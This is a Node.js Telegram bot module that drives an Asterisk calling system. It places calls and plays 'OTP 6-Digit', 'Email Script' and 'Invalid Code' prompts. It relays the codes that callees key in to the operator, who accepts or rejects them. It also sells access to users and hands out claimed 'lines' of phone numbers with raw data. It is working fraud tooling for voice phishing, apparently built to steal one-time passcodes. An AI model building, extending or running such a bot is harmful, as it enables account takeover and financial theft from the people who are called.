const config = require("../config");
const Call = require("../models/call");
const axios = require("axios");
const Allowed = require("../models/allowed");
const { get_settings, set_settings } = require("../utils/settings");
const { sanitize_phoneNumber } = require("../utils/sanitization");
const { waitForConnection } = require("../asterisk/instance");
const { start_bot_instance } = require("./botInstance");
const { InteractiveCallManager } = require("../interactive-call-manager");
const fs = require("fs");
const path = require("path");

// Shared call manager instance (will be set from app.js)
let callManager = null;
let bot = null;

// User sessions to track call states
const userSessions = new Map();
const callIdToChat = new Map(); // Map call IDs to chat IDs

// Helper function to get the shared call manager
function getCallManager() {
  if (!callManager) {
    // Try to get the call manager from the Express app locals
    try {
      const app = require('../app');
      callManager = app.locals.callManager;
      if (callManager) {
        setupCallManagerEvents();
      }
    } catch (error) {
      console.error('Error getting shared call manager:', error);
      throw new Error('Call manager not available');
    }
  }
  return callManager;
}

// Setup event listeners for call manager
function setupCallManagerEvents() {
  if (!callManager || !bot) return;

  callManager.on('callAnswered', (callId, answerType) => {
    const chatId = callIdToChat.get(callId);
    if (chatId) {
      bot.sendMessage(chatId, 
        `📞 <b>Call Answered</b>\n\n` +
        `🔍 Analyzing call type...`,
        { parse_mode: "HTML" }
      );
    }
  });

  callManager.on('humanDetected', (callId) => {
    const chatId = callIdToChat.get(callId);
    if (chatId) {
      bot.sendMessage(chatId, 
        `👤 <b>Human Detected!</b>\n\n` +
        `🎵 Intro playing...`,
        { parse_mode: "HTML" }
      );
    }
  });

  callManager.on('voicemailDetected', (callId) => {
    const chatId = callIdToChat.get(callId);
    if (chatId) {
      bot.sendMessage(chatId, 
        `📮 <b>Voicemail Detected!</b>\n\n` +
        `🆔 Call ID: <code>${callId}</code>\n` +
        `📢 Call went to voicemail\n` +
        `🎵 Leaving automated message...`,
        { parse_mode: "HTML" }
      );
    }
  });

  callManager.on('answeringMachineDetected', (callId) => {
    const chatId = callIdToChat.get(callId);
    if (chatId) {
      bot.sendMessage(chatId, 
        `📻 <b>Answering Machine Detected!</b>\n\n` +
        `🆔 Call ID: <code>${callId}</code>\n` +
        `🤖 Answering machine picked up\n` +
        `⏳ Waiting for beep to leave message...`,
        { parse_mode: "HTML" }
      );
    }
  });

  callManager.on('showTelegramMenu', (callId) => {
    console.log(`📱 Telegram showTelegramMenu event received for call: ${callId}`);
    
    // Find the chat ID - try exact match first, then search through all active calls
    let chatId = callIdToChat.get(callId);
    
    if (!chatId) {
      console.log(`❌ No direct chat mapping found for call ${callId}, searching all mappings...`);
      // Try to find any active call that might match
      for (let [mappedCallId, mappedChatId] of callIdToChat.entries()) {
        console.log(`   Checking mapping: ${mappedCallId} -> ${mappedChatId}`);
      }
      
      // If we still don't have a chat ID, use the first available one (fallback)
      if (callIdToChat.size > 0) {
        chatId = Array.from(callIdToChat.values())[0];
        console.log(`⚡ Using fallback chat ID: ${chatId}`);
      }
    }
    
    if (chatId) {
      console.log(`✅ Sending Telegram menu to chat ${chatId} for call ${callId}`);
      bot.sendMessage(chatId, 
        `🎯 <b>Pressed 1 - Audio Stopped</b>\n\n` +
        `✅ Current recording has been stopped\n` +
        `⏳ "Please wait while we process your request" is now playing\n\n` +
        `Choose which audio to play next:`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                { text: "📧 Email Script", callback_data: `play_audio_${callId}_email` },
                { text: "🔐 OTP 6-Digit", callback_data: `play_audio_${callId}_otp6` }
              ],
              [
                { text: "❌ Invalid Code", callback_data: `play_audio_${callId}_invalidcode` },
                { text: "💬 Custom TTS", callback_data: `tts_input_${callId}` }
              ]
            ]
          }
        }
      ).then(() => {
        console.log(`✅ Telegram menu sent successfully`);
        // Notify the terminal that the menu has been shown
        callManager.emit('telegramMenuShown', callId);
      }).catch((error) => {
        console.error(`❌ Error sending Telegram menu:`, error);
      });
    } else {
      console.error(`❌ No chat ID found for call ${callId} - cannot send Telegram menu`);
      console.log(`📊 Current call mappings:`, Array.from(callIdToChat.entries()));
    }
  });

  callManager.on('dtmfCodeReceived', (callId, code) => {
    const chatId = callIdToChat.get(callId);
    if (chatId) {
      bot.sendMessage(chatId, 
        `🔢 <b>DTMF: <code>${code}</code></b>`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                { text: "✅ Accept Code", callback_data: `accept_code_${callId}` },
                { text: "❌ Reject Code", callback_data: `reject_code_${callId}` }
              ],
              [
                { text: "🎵 Play Press2", callback_data: `play_press2_${callId}` }
              ]
            ]
          }
        }
      );
    }
  });

  // Handle manual DTMF options display
  callManager.on('showDTMFOptions', (callId) => {
    const chatId = callIdToChat.get(callId);
    if (chatId) {
      bot.sendMessage(chatId, 
        `🔢 <b>Manual DTMF Options</b>\n\n` +
        `🆔 Call ID: <code>${callId}</code>\n\n` +
        `Available DTMF digits to send:`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                { text: "1️⃣", callback_data: `send_dtmf_${callId}_1` },
                { text: "2️⃣", callback_data: `send_dtmf_${callId}_2` },
                { text: "3️⃣", callback_data: `send_dtmf_${callId}_3` }
              ],
              [
                { text: "4️⃣", callback_data: `send_dtmf_${callId}_4` },
                { text: "5️⃣", callback_data: `send_dtmf_${callId}_5` },
                { text: "6️⃣", callback_data: `send_dtmf_${callId}_6` }
              ],
              [
                { text: "7️⃣", callback_data: `send_dtmf_${callId}_7` },
                { text: "8️⃣", callback_data: `send_dtmf_${callId}_8` },
                { text: "9️⃣", callback_data: `send_dtmf_${callId}_9` }
              ],
              [
                { text: "*️⃣", callback_data: `send_dtmf_${callId}_*` },
                { text: "0️⃣", callback_data: `send_dtmf_${callId}_0` },
                { text: "#️⃣", callback_data: `send_dtmf_${callId}_#` }
              ]
            ]
          }
        }
      );
    }
  });

  callManager.on('invalidCodeEntered', (callId, code) => {
    const chatId = callIdToChat.get(callId);
    if (chatId) {
      bot.sendMessage(chatId, 
        `❌ <b>Invalid Code!</b>\n\n` +
        `🆔 Call ID: <code>${callId}</code>\n` +
        `🔢 Invalid Code: <code>${code}</code>\n\n` +
        `What would you like to do?`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                { text: "🔄 Retry", callback_data: `retry_input_${callId}` },
                { text: "💬 Custom Message", callback_data: `tts_input_${callId}` }
              ]
            ]
          }
        }
      );
    }
  });

  callManager.on('connectToCaller', (callId) => {
    const chatId = callIdToChat.get(callId);
    if (chatId) {
      bot.sendMessage(chatId, 
        `📞 <b>Connecting to Caller!</b>\n\n` +
        `🆔 Call ID: <code>${callId}</code>\n` +
        `🔗 Playing press9 audio and connecting...`,
        { parse_mode: "HTML" }
      );
    }
  });

  callManager.on('callEnded', (callId) => {
    const chatId = callIdToChat.get(callId);
    if (chatId) {
      bot.sendMessage(chatId, 
        `📴 <b>Call Ended</b>\n\n` +
        `🆔 Call ID: <code>${callId}</code>\n` +
        `⏰ Call has been terminated.`,
        { parse_mode: "HTML" }
      );
      callIdToChat.delete(callId);
    }
  });
}

// Helper function to parse phone number from text
function parsePhoneNumber(text) {
  const phoneRegex = /(?:\+?1\s?)?(?:\(?\d{3}\)?[\s.-]?)?\d{3}[\s.-]?\d{4}/;
  const match = text.match(phoneRegex);
  return match ? match[0].replace(/\D/g, "") : null;
}

// Helper function to save uploaded audio file
async function saveUploadedAudio(fileBuffer, fileName) {
  const uploadsDir = path.join(__dirname, "../uploads");
  if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir, { recursive: true });
  }
  
  const filePath = path.join(uploadsDir, fileName);
  fs.writeFileSync(filePath, fileBuffer);
  return filePath;
}

// Initialize Telegram Bot
const initializeBot = () => {
  console.log('Initializing Telegram bot...');
  bot = start_bot_instance(); // Assign to global bot variable
  const adminId = config.creator_telegram_id;
  console.log('Bot initialized with admin ID:', adminId);

  // Handle TTS, phone number, and name input
  bot.onText(/^(?!\/)[\s\S]+/, async (msg) => {
    const chatId = msg.chat.id;
    const session = userSessions.get(chatId) || {};

    // Handle TTS input
    if (session.waitingForTTS && session.currentCallId) {
      try {
        const manager = getCallManager();
        await manager.playTTSMessage(session.currentCallId, msg.text);
        bot.sendMessage(chatId, `🗣️ <b>TTS Message Sent!</b>\n\n💬 Message: "${msg.text}"`, { parse_mode: "HTML" });
        userSessions.set(chatId, { ...session, waitingForTTS: false, currentCallId: null });
      } catch (error) {
        bot.sendMessage(chatId, `❌ Error sending TTS: ${error.message}`);
      }
      return;
    }

    // Handle phone number input
    const phoneNumber = parsePhoneNumber(msg.text);
    if (phoneNumber && session.waitingForPhone) {
      userSessions.set(chatId, { ...session, waitingForPhone: false, waitingForName: true, phoneNumber });
      bot.sendMessage(chatId, "👤 Please enter a name for this number:");
      return;
    }

    // Handle name input
    if (session.waitingForName) {
      const name = msg.text;
      const { phoneNumber } = session;
      try {
        const manager = getCallManager();
        const callId = await manager.initiateCall(phoneNumber, name);
        
        callIdToChat.set(callId, chatId);
        userSessions.set(chatId, { ...session, callId, phoneNumber, name, waitingForName: false });
        
        bot.sendMessage(chatId, 
          `📞 <b>Initiating call...</b> 📞\n\n` +
          `🆔 Call ID: <code>${callId}</code>\n` +
          `👤 Name: <code>${name}</code>\n` +
          `📱 Phone: <code>${phoneNumber}</code>`,
          { parse_mode: "HTML" }
        );
      } catch (error) {
        bot.sendMessage(chatId, `❌ Failed to initiate call: ${error.message}`);
        userSessions.delete(chatId);
      }
      return;
    }
  });

  bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    console.log('Received /start command from:', msg.from.id, 'in chat:', chatId);
    try {
      await bot.sendMessage(chatId, "🎯 Welcome to Interactive Call Manager! Use the options below:", {
        reply_markup: {
          inline_keyboard: [
            [
              { text: "📞 Call", callback_data: "make_call" },
              { text: "🎵 Upload Audio File", callback_data: "upload_audio" },
            ],
            [
              { text: "📊 Active Calls", callback_data: "active_calls" },
              { text: "🔢 DTMF Menu Options", callback_data: "dtmf_options" },
            ],
            [
              { text: "📋 Licensing", callback_data: "licensing" },
            ],
            [
              { text: "📍 Set Notifications", callback_data: "set_notifications" },
            ],
          ],
        },
      });
    } catch (error) {
      console.error('Error sending start message:', error.message);
    }
  });

  bot.onText(/\/permit (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = match[1];
    if (msg.from.id != adminId)
      return bot.sendMessage(
        chatId,
        "❌ You are not authorized to use this command."
      );

    try {
      const existingUser = await Allowed.findOne({ telegram_id: userId });
      if (existingUser)
        return bot.sendMessage(chatId, `⚠️ This user is already permitted.`);
      await new Allowed({ telegram_id: userId }).save();
      bot.sendMessage(
        chatId,
        `✅ User with ID <code>${userId}</code> has been permitted.`,
        { parse_mode: "HTML" }
      );
    } catch (error) {
      bot.sendMessage(
        chatId,
        `❌ Failed to permit user with ID <code>${userId}</code>. Error: ${error.message}`,
        { parse_mode: "HTML" }
      );
    }
  });

  bot.onText(/\/unpermit (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = match[1];
    if (msg.from.id !== adminId)
      return bot.sendMessage(
        chatId,
        "❌ You are not authorized to use this command."
      );

    try {
      const user = await Allowed.findOneAndDelete({ telegram_id: userId });
      if (!user)
        return bot.sendMessage(chatId, `⚠️ This user is not permitted.`);
      bot.sendMessage(
        chatId,
        `✅ User with ID <code>${userId}</code> has been unpermitted.`,
        { parse_mode: "HTML" }
      );
    } catch (error) {
      bot.sendMessage(
        chatId,
        `❌ Failed to unpermit user with ID <code>${userId}</code>. Error: ${error.message}`,
        { parse_mode: "HTML" }
      );
    }
  });

  bot.onText(/\/count/, async (msg) => {
    const chatId = msg.chat.id;
    const linesAmount = await Call.countDocuments({ used: false });

    return bot.sendMessage(
      chatId,
      `📊 <b>There are currently <u>${linesAmount}</u> lines left!</b>\n\n👤 <b>User:</b> <a href="tg://user?id=${msg.from.id}">@${msg.from.username}</a>`,
      { parse_mode: "HTML" }
    );
  });

  bot.onText(/\/line/, async (msg) => {
    const chatId = msg.chat.id;
    const isAllowed = await Allowed.findOne({ telegram_id: msg.from.id });
    const callsLeft = await Call.countDocuments({ used: false });

    if (!isAllowed) {
      return bot.sendMessage(
        chatId,
        `🚫 You are not permitted to use this command!`,
        { parse_mode: "HTML" }
      );
    }

    if (callsLeft === 0) {
      return bot.sendMessage(chatId, `❌ No lines left!`, {
        parse_mode: "HTML",
      });
    }

    const callData = await Call.findOneAndUpdate(
      { used: false },
      { used: true },
      { new: true }
    );

    bot.sendMessage(
      chatId,
      `✅ You have successfully claimed a line! \n\n` +
        `📞 *Phone Number*: \`${callData.phoneNumber}\`\n` +
        `🔲 *Raw Line*: \`${callData.rawLine}\``,
      {
        parse_mode: "Markdown",
      }
    );
  });

  bot.onText(/\/call/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "📤 Reply with the file that contains your lines", {
      parse_mode: "HTML",
    });
  });


  // Handle audio file uploads
  bot.on("audio", async (msg) => {
    await handleAudioUpload(msg, bot);
  });

  bot.on("voice", async (msg) => {
    await handleAudioUpload(msg, bot);
  });

  bot.on("document", async (msg) => {
    if (msg.document.mime_type && msg.document.mime_type.startsWith("audio/")) {
      await handleAudioUpload(msg, bot);
    } else {
      bot.sendMessage(msg.chat.id, "❌ Please upload an audio file (WAV, MP3, etc.)");
    }
  });

  // Handle audio upload function
  async function handleAudioUpload(msg, bot) {
    const chatId = msg.chat.id;
    const session = userSessions.get(chatId);
    
    if (!session || !session.callId) {
      return bot.sendMessage(chatId, "❌ No active call found. Please make a call first.");
    }

    try {
      const fileId = msg.audio?.file_id || msg.voice?.file_id || msg.document?.file_id;
      const file = await bot.getFile(fileId);
      const filePath = `https://api.telegram.org/file/bot${config.telegram_bot_token}/${file.file_path}`;
      const fileBuffer = (await axios.get(filePath, { responseType: "arraybuffer" })).data;
      
      const fileName = `audio_${session.callId}_${Date.now()}.wav`;
      const savedPath = await saveUploadedAudio(fileBuffer, fileName);
      
      const manager = getCallManager();
      await manager.uploadAudioForCall(session.callId, savedPath);
      
      bot.sendMessage(chatId, 
        `✅ <b>Audio Uploaded!</b>\n\n` +
        `🎵 Audio file uploaded for call ID: <code>${session.callId}</code>\n` +
        `📞 Phone: <code>${session.phoneNumber}</code>\n\n` +
        `🔢 Now the caller can press:\n` +
        `• <b>1</b> - Play first script\n` +
        `• <b>2</b> - Play hold music\n` +
        `• <b>9</b> - Connect to live agent`,
        { parse_mode: "HTML" }
      );
    } catch (error) {
      bot.sendMessage(chatId, `❌ Failed to upload audio: ${error.message}`);
    }
  }

  // Respond to agent selection
  config.agents.forEach((agent) => {
    bot.on("callback_query", (callbackQuery) => {
      const chatId = callbackQuery.message.chat.id;
      const callbackData = callbackQuery.data;

      if (callbackData === `set_agent_${agent}`) {
        set_settings({ agent });
        bot.sendMessage(
          chatId,
          `✅ Successfully changed the script to <b>${
            agent.charAt(0).toUpperCase() + agent.slice(1)
          }</b>`,
          { parse_mode: "HTML" }
        );
      }
    });
  });

  bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const callbackData = query.data;

    // Handle play audio callbacks
    if (callbackData.startsWith('play_audio_')) {
      const parts = callbackData.split('_');
      const callId = parts[2];
      const audioType = parts.slice(3).join('_');
      
      try {
        bot.sendMessage(chatId, 
          `⏳ Please wait while your request is being processed...`,
          { parse_mode: "HTML" }
        );
        
        const manager = getCallManager();
        await manager.playAudioToCall(callId, audioType);

        const displayType = audioType === 'otp6' ? 'OTP 6' : audioType === 'invalidcode' ? 'invalid code' : audioType;
        bot.sendMessage(chatId, 
          `${displayType === 'OTP 6' ? '🔐' : displayType === 'email' ? '📧' : '❌'} <b>${displayType} audio is now playing.</b>\n\n` +
          `<i>The caller will now be prompted to enter a 6-digit code.</i>`,
          { parse_mode: "HTML" }
        );

      } catch (error) {
        bot.sendMessage(chatId, `❌ Error playing audio: ${error.message}`);
      }
      bot.answerCallbackQuery(query.id);
      return;
    }
    
    // Handle TTS input callbacks
    if (callbackData.startsWith('tts_input_')) {
      const callId = callbackData.replace('tts_input_', '');
      userSessions.set(chatId, { ...userSessions.get(chatId), waitingForTTS: true, currentCallId: callId });
      bot.sendMessage(chatId, 
        `💬 <b>Custom TTS Message</b>\n\n` +
        `🆔 Call ID: <code>${callId}</code>\n\n` +
        `Please type the message you want to convert to speech:`,
        { parse_mode: "HTML" }
      );
      bot.answerCallbackQuery(query.id);
      return;
    }
    
    // Handle accept/reject code callbacks
    if (callbackData.startsWith('accept_code_') || callbackData.startsWith('reject_code_')) {
      const action = callbackData.startsWith('accept_code_') ? 'accept' : 'reject';
      const callId = callbackData.replace(`${action}_code_`, '');
      
      try {
        const manager = getCallManager();
        if (action === 'accept') {
          await manager.playAudioToCall(callId, 'press2');
          bot.sendMessage(chatId, 
            `✅ <b>Code Accepted</b>\n\n` +
            `🆔 Call ID: <code>${callId}</code>\n` +
            `🎵 Playing press2 audio...`,
            { parse_mode: "HTML" }
          );
        } else {
          await manager.playAudioToCall(callId, 'invalid');
          bot.sendMessage(chatId, 
            `❌ <b>Code Rejected</b>\n\n` +
            `🆔 Call ID: <code>${callId}</code>\n` +
            `🎵 Playing invalid code audio...`,
            { parse_mode: "HTML" }
          );
        }
      } catch (error) {
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
      }
      bot.answerCallbackQuery(query.id);
      return;
    }
    
    // Handle play press2 callback
    if (callbackData.startsWith('play_press2_')) {
      const callId = callbackData.replace('play_press2_', '');
      
      try {
        const manager = getCallManager();
        await manager.playAudioToCall(callId, 'press2');
        bot.sendMessage(chatId, 
          `🎵 <b>Playing Press2 Audio</b>\n\n` +
          `🆔 Call ID: <code>${callId}</code>`,
          { parse_mode: "HTML" }
        );
      } catch (error) {
        bot.sendMessage(chatId, `❌ Error playing press2: ${error.message}`);
      }
      bot.answerCallbackQuery(query.id);
      return;
    }

    // Handle manual DTMF digit sending
    if (callbackData.startsWith('send_dtmf_')) {
      const parts = callbackData.split('_');
      const callId = parts[2];
      const digit = parts[3];
      
      try {
        const manager = getCallManager();
        const result = await manager.sendManualDTMF(callId, digit);
        bot.sendMessage(chatId, 
          `🔢 <b>Manual DTMF Sent!</b>\n\n` +
          `🆔 Call ID: <code>${callId}</code>\n` +
          `🔢 Digit: <code>${digit}</code>\n\n` +
          `📡 ${result.message}`,
          { parse_mode: "HTML" }
        );
      } catch (error) {
        bot.sendMessage(chatId, `❌ Error sending DTMF: ${error.message}`);
      }
      bot.answerCallbackQuery(query.id);
      return;
    }

    // Handle show DTMF options callback
    if (callbackData.startsWith('show_dtmf_')) {
      const callId = callbackData.replace('show_dtmf_', '');
      
      try {
        const manager = getCallManager();
        await manager.showDTMFOptions(callId);
      } catch (error) {
        bot.sendMessage(chatId, `❌ Error showing DTMF options: ${error.message}`);
      }
      bot.answerCallbackQuery(query.id);
      return;
    }

    switch (callbackData) {
      case "make_call":
        userSessions.set(chatId, { waitingForPhone: true });
        callIdToChat.set(chatId, chatId); // Map for event handling
        bot.sendMessage(
          chatId,
          "📞 <b>Call</b>\n\nPlease enter the phone number you want to call:\n\n<i>Example: +1234567890 or 1234567890</i>",
          { parse_mode: "HTML" }
        );
        break;

      case "upload_audio":
        const session = userSessions.get(chatId);
        if (!session || !session.callId) {
          bot.sendMessage(chatId, "❌ No active call found. Please make a call first.");
        } else {
          bot.sendMessage(
            chatId,
            "🎵 <b>Upload Audio File</b>\n\nPlease upload an audio file (WAV, MP3, etc.) for the current call.",
            { parse_mode: "HTML" }
          );
        }
        break;

      case "active_calls":
        try {
          const manager = getCallManager();
          const activeCalls = await manager.getActiveCalls();
          
          if (activeCalls.length === 0) {
            bot.sendMessage(chatId, "📊 <b>Active Calls</b>\n\nNo active calls at the moment.", { parse_mode: "HTML" });
          } else {
            let message = "📊 <b>Active Calls</b>\n\n";
            let buttons = [];
            activeCalls.forEach(([callId, callData], index) => {
              message += `${index + 1}. 📞 <code>${callData.phoneNumber}</code>\n`;
              message += `   🆔 Call ID: <code>${callId}</code>\n`;
              message += `   📍 Status: ${callData.status}\n\n`;
              
              // Add manual DTMF button for each active call
              buttons.push([{ text: `🔢 Manual DTMF - ${callData.phoneNumber}`, callback_data: `show_dtmf_${callId}` }]);
            });
            bot.sendMessage(chatId, message, { 
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: buttons
              }
            });
          }
        } catch (error) {
          bot.sendMessage(chatId, `❌ Error getting active calls: ${error.message}`);
        }
        break;

      case "dtmf_options":
        bot.sendMessage(
          chatId,
          "🔢 <b>DTMF Menu Options</b>\n\n" +
          "When a call is active, the caller can press:\n\n" +
          "• <b>1</b> - Play first script/audio\n" +
          "• <b>2</b> - Play hold music\n" +
          "• <b>9</b> - Connect to live agent\n\n" +
          "<i>These options are automatically handled by the system.</i>",
          { parse_mode: "HTML" }
        );
        break;

      case "licensing":
        bot.sendMessage(
          chatId,
          `📋 <b>Licensing</b>\n\nTo permit/unpermit a user, type <code>/permit &lt;Telegram ID&gt;</code> or <code>/unpermit &lt;Telegram ID&gt;</code>.`,
          { parse_mode: "HTML" }
        );
        break;

      case "line":
        bot.sendMessage(
          chatId,
          "💬 <b>Claim a Line</b>\n\nTo claim a line, simply use the <code>/line</code> command directly.",
          { parse_mode: "HTML" }
        );
        break;

      case "set_notifications":
        set_settings({ notifications_chat_id: chatId });
        bot.sendMessage(
          chatId,
          `✅ <b>Notifications Channel Updated</b>\n\nSuccessfully changed the notifications channel to <code>${chatId}</code>. You will now receive updates in this channel.`,
          { parse_mode: "HTML" }
        );
        break;

      case "set_agent":
        bot.sendMessage(
          chatId,
          "Please choose one of the following agents below:",
          {
            reply_markup: {
              inline_keyboard: config.agents.map((agent) => [
                {
                  text: `👤 ${agent.charAt(0).toUpperCase() + agent.slice(1)}`,
                  callback_data: `set_agent_${agent}`,
                },
              ]),
            },
          }
        );
        break;
    }

    bot.answerCallbackQuery(query.id);
  });
};

module.exports = { initializeBot };
